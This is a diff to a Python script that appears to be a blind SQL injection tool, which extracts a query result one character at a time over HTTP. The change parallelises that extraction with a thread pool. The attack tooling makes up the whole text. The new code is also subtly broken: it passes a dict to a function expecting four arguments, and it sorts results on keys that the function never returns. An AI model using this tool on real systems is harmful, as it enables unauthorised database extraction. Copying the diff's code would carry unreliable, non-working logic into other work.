@@ -2,6 +2,7 @@ import sys
 import logging
 import urllib3
 import string
+import concurrent.futures
 
 import requests
 
@@ -89,13 +90,31 @@ def determine_response_char(inner_query, index, url, no_proxy=False):
             response_char = chr(x)
             return response_char
 
+def format_results(response_chars):
+    results = [
+        res["result"] for res in sorted(response_chars, key=lambda item: item["position"])
+    ]
+    return "".join(results)
 
-def get_response_string(inner_query, url, no_proxy):
-    response_chars = []
-    response_lenght = determine_response_length(inner_query, url, no_proxy)
+
+
+def get_response_string(inner_query, url, no_proxy, num_threads):
+    response_lenght = determine_response_length(inner_query, url, no_proxy) #here
+    tasks = []
     for i in range(1, response_lenght + 1):
-        response_chars.append(determine_response_char(inner_query, i, url, no_proxy))
-    return "".join(response_chars)
+        result = {"position": i, "url": url, "no_proxy": no_proxy, "inner_query": inner_query}# t2
+        tasks.append(result)    
+    response_chars = []
+    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
+        results = [executor.submit(determine_response_char, task) for task in tasks]
+        for f in concurrent.futures.as_completed(results):
+            response_chars.append(f.result())
+    return format_results(response_chars)        
+            
+#    response_lenght = determine_response_length(inner_query, url, no_proxy)
+#    for i in range(1, response_lenght + 1):
+#        response_chars.append(determine_response_char(inner_query, i, url, no_proxy))
+#    return "".join(response_chars)
 
 
 def main(args):
